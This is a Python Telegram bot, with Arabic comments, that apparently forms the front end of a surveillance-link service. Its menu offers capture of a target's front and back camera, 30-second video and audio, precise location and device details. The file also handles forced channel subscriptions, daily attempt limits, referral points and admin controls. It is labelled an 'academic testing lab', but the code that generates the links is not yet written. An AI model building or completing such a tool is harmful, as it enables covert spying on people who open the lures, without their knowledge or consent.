import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import time
import requests
from datetime import datetime
from config import config
from database import *
from utils import *

bot = telebot.TeleBot(config.BOT_TOKEN)

# ====== تخزين الجلسات المؤقتة ======
sessions = {}
user_states = {}

# ====== دالة التحقق من الاشتراك ======
def check_subscription(user_id):
    """التحقق من اشتراك المستخدم في القنوات الإجبارية"""
    channels = get_required_channels()
    if not channels:
        return True
    
    for channel in channels:
        try:
            member = bot.get_chat_member(channel['channel_id'], user_id)
            if member.status in ['left', 'kicked']:
                return False
        except:
            return False
    return True

# ====== دالة التحقق من المحاولات اليومية ======
def check_daily_attempts(user_id):
    """التحقق من عدد المحاولات المجانية اليومية"""
    limit = get_free_attempts_limit()
    attempts = get_daily_attempts(user_id)
    return attempts < limit

# ====== القائمة الرئيسية (بدون زر الملفات) ======
def main_menu(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    
    # الميزات الأساسية (تم حذف زر الملفات)
    markup.add(
        InlineKeyboardButton("📷 كاميرا أمامية", callback_data="camera_front"),
        InlineKeyboardButton("📷 كاميرا خلفية", callback_data="camera_back"),
        InlineKeyboardButton("🎥 فيديو (30s)", callback_data="video"),
        InlineKeyboardButton("🎙 صوت (30s)", callback_data="audio"),
        InlineKeyboardButton("📍 موقع دقيق", callback_data="location"),
        InlineKeyboardButton("📱 معلومات الجهاز", callback_data="device"),
        InlineKeyboardButton("🔬 الكل في واحد", callback_data="all")
    )
    
    # أزرار الإدارة (تظهر فقط للمديرين)
    user = get_user(user_id)
    if user and user['is_admin']:
        markup.add(
            InlineKeyboardButton("⚙️ لوحة الإدارة", callback_data="admin_panel")
        )
    
    # معلومات المستخدم
    markup.add(
        InlineKeyboardButton(f"⭐ نقاطي: {user['points'] if user else 0}", callback_data="my_points")
    )
    
    return markup

# ====== لوحة الإدارة ======
def admin_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📊 الإحصائيات", callback_data="admin_stats"),
        InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="admin_users"),
        InlineKeyboardButton("📢 إدارة القنوات", callback_data="admin_channels"),
        InlineKeyboardButton("⚙️ إعدادات البوت", callback_data="admin_settings"),
        InlineKeyboardButton("⭐ إدارة النقاط", callback_data="admin_points"),
        InlineKeyboardButton("🔧 إدارة الميزات", callback_data="admin_features"),
        InlineKeyboardButton("📨 التواصل مع الإدمن", callback_data="admin_contact"),
        InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
    )
    return markup

# ====== أوامر البوت ======
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    username = message.from_user.username or ''
    first_name = message.from_user.first_name or ''
    last_name = message.from_user.last_name or ''
    
    # التحقق من وجود المستخدم
    user = get_user(user_id)
    
    # معالجة كود الدعوة (إذا وجد)
    invite_code = None
    if len(message.text.split()) > 1:
        invite_code = message.text.split()[1]
        # البحث عن المستخدم الذي يملك هذا الكود
        conn = get_db()
        inviter = conn.execute('SELECT user_id FROM users WHERE invite_code = ?', (invite_code,)).fetchone()
        conn.close()
        if inviter:
            invited_by = inviter['user_id']
        else:
            invited_by = None
    else:
        invited_by = None
    
    if not user:
        # مستخدم جديد
        create_user(user_id, username, first_name, last_name, invited_by)
        user = get_user(user_id)
        
        # تسجيل أول دخول
        log_action(user_id, 'first_join', f'@{username} - {first_name} {last_name}')
        
        # رسالة الترحيب
        welcome_msg = f"""
🔬 **مرحباً بك في مختبر الاختبار القانوني!**

👤 {first_name} {last_name}
🆔 {user_id}
⭐ نقاطك: {user['points']}

📋 استخدم الأزرار للتحكم في البوت.
⚠️ هذا المختبر للأغراض الأكاديمية والبحثية فقط.
        """
        bot.send_message(user_id, welcome_msg, parse_mode='Markdown', reply_markup=main_menu(user_id))
    else:
        # مستخدم موجود
        update_user_activity(user_id)
        bot.send_message(
            user_id,
            f"🔬 **أهلاً بعودتك!**\n⭐ نقاطك: {user['points']}",
            parse_mode='Markdown',
            reply_markup=main_menu(user_id)
        )

@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    if user:
        bot.send_message(
            user_id,
            "📋 **القائمة الرئيسية:**",
            parse_mode='Markdown',
            reply_markup=main_menu(user_id)
        )

# ====== معالجة الأزرار ======
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = call.from_user.id
    data = call.data
    
    # التحقق من الاشتراك في القنوات الإجبارية
    if not check_subscription(user_id):
        channels = get_required_channels()
        msg = "⚠️ **يجب الاشتراك في القنوات التالية لاستخدام البوت:**\n\n"
        for ch in channels:
            try:
                chat = bot.get_chat(ch['channel_id'])
                msg += f"🔹 {chat.title}\n"
            except:
                msg += f"🔹 {ch['channel_id']}\n"
        msg += "\nبعد الاشتراك، أعد المحاولة."
        bot.answer_callback_query(call.id, "❌ يرجى الاشتراك في القنوات المطلوبة")
        bot.send_message(user_id, msg, parse_mode='Markdown')
        return
    
    # التحقق من تفعيل الميزة (تم حذف 'files' من القائمة)
    feature_name = data.split('_')[0] if '_' in data else data
    if feature_name in ['camera', 'audio', 'video', 'location', 'device', 'all']:
        if not is_feature_enabled(feature_name):
            bot.answer_callback_query(call.id, "❌ هذه الميزة معطلة حالياً")
            bot.send_message(user_id, "⛔ هذه الميزة معطلة حالياً من قبل الإدارة.")
            return
    
    # معالجة الأزرار
    if data == 'back_to_menu':
        bot.edit_message_text(
            "📋 **القائمة الرئيسية:**",
            user_id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu(user_id)
        )
        bot.answer_callback_query(call.id)
        return
    
    if data == 'my_points':
        user = get_user(user_id)
        bot.answer_callback_query(call.id, f"⭐ نقاطك: {user['points'] if user else 0}")
        return
    
    # ====== لوحة الإدارة ======
    if data == 'admin_panel':
        user = get_user(user_id)
        if user and user['is_admin']:
            bot.edit_message_text(
                "⚙️ **لوحة الإدارة**",
                user_id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=admin_panel()
            )
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إدارة القنوات ======
    if data == 'admin_channels':
        user = get_user(user_id)
        if user and user['is_admin']:
            channels = get_required_channels()
            msg = "📢 **القنوات الإجبارية:**\n\n"
            if channels:
                for ch in channels:
                    try:
                        chat = bot.get_chat(ch['channel_id'])
                        msg += f"🔹 {chat.title} (`{ch['channel_id']}`)\n"
                    except:
                        msg += f"🔹 {ch['channel_id']}\n"
            else:
                msg += "📭 لا توجد قنوات إجبارية\n"
            
            msg += "\n📌 استخدم الأوامر التالية:\n"
            msg += "`/add_channel [id] [الاسم]` - إضافة قناة\n"
            msg += "`/remove_channel [id]` - حذف قناة"
            
            bot.edit_message_text(
                msg,
                user_id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton("🔙 العودة", callback_data="admin_panel")
                )
            )
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # ====== إدارة الميزات (تم حذف 'files' من القائمة) ======
    if data == 'admin_features':
        user = get_user(user_id)
        if user and user['is_admin']:
            features = ['camera', 'audio', 'video', 'location', 'device', 'all']
            markup = InlineKeyboardMarkup(row_width=2)
            
            for f in features:
                status = "✅" if is_feature_enabled(f) else "❌"
                markup.add(
                    InlineKeyboardButton(f"{status} {f.title()}", callback_data=f"toggle_{f}")
                )
            
            markup.add(InlineKeyboardButton("🔙 العودة", callback_data="admin_panel"))
            
            bot.edit_message_text(
                "🔧 **إدارة الميزات**\nاضغط على الميزة لتفعيل/تعطيل:",
                user_id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
        else:
            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
        return
    
    # تبديل الميزات
    if data.startswith('toggle_'):
        user = get_user(user_id)
        if user and user['is_admin']:
            feature = data.replace('toggle_', '')
            new_status = toggle_feature(feature)
            status_text = "مُفعلة ✅" if new_status else "معطلة ❌"
            bot.answer_callback_query(call.id, f"تم {status_text}")
            
            # تحديث القائمة (تم حذف 'files')
            features = ['camera', 'audio', 'video', 'location', 'device', 'all']
            markup = InlineKeyboardMarkup(row_width=2)
            for f in features:
                status = "✅" if is_feature_enabled(f) else "❌"
                markup.add(
                    InlineKeyboardButton(f"{status} {f.title()}", callback_data=f"toggle_{f}")
                )
            markup.add(InlineKeyboardButton("🔙 العودة", callback_data="admin_panel"))
            
            bot.edit_message_text(
                f"🔧 **إدارة الميزات**\n{feature.title()} الآن {status_text}",
                user_id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
        return
    
    # ====== معالجة إنشاء الروابط ======
    # سيتم إضافة باقي الميزات في الجزء التالي...
    
    bot.answer_callback_query(call.id)

# ====== أوامر الإدارة ======
@bot.message_handler(commands=['add_channel'])
def add_channel_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    try:
        parts = message.text.split(maxsplit=2)
        if len(parts) < 3:
            bot.reply_to(message, "❌ استخدم: /add_channel [id] [الاسم]")
            return
        
        channel_id = parts[1]
        channel_name = parts[2]
        
        add_required_channel(channel_id, channel_name)
        bot.reply_to(message, f"✅ تم إضافة القناة: {channel_name}")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['remove_channel'])
def remove_channel_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ استخدم: /remove_channel [id]")
            return
        
        channel_id = parts[1]
        remove_required_channel(channel_id)
        bot.reply_to(message, f"✅ تم حذف القناة")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['add_points'])
def add_points_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ استخدم: /add_points [user_id] [number]")
            return
        
        target_id = int(parts[1])
        points = int(parts[2])
        
        add_points(target_id, points, 'admin_add')
        bot.reply_to(message, f"✅ تم إضافة {points} نقاط للمستخدم {target_id}")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['set_free_attempts'])
def set_free_attempts_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ استخدم: /set_free_attempts [number]")
            return
        
        number = int(parts[1])
        set_setting('free_attempts', str(number))
        bot.reply_to(message, f"✅ تم تعيين عدد المحاولات المجانية: {number}")
    except:
        bot.reply_to(message, "❌ حدث خطأ")

@bot.message_handler(commands=['stats'])
def stats_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    if not user or not user['is_admin']:
        bot.reply_to(message, "❌ غير مصرح لك")
        return
    
    conn = get_db()
    total_users = conn.execute('SELECT COUNT(*) FROM users').fetchone()[0]
    total_points = conn.execute('SELECT SUM(points) FROM users').fetchone()[0]
    total_invites = conn.execute('SELECT COUNT(*) FROM invites').fetchone()[0]
    total_logs = conn.execute('SELECT COUNT(*) FROM user_logs').fetchone()[0]
    conn.close()
    
    msg = f"""
📊 **إحصائيات البوت**

👥 إجمالي المستخدمين: {total_users}
⭐ إجمالي النقاط: {total_points or 0}
📨 إجمالي الدعوات: {total_invites}
📋 عدد السجلات: {total_logs}
    """
    bot.reply_to(message, msg, parse_mode='Markdown')

# ====== تشغيل البوت ======
def run_bot():
    while True:
        try:
            bot.polling(none_stop=True, interval=1)
        except Exception as e:
            print(f"⚠️ خطأ في البوت: {e}")
            time.sleep(5)

if __name__ == '__main__':
    run_bot()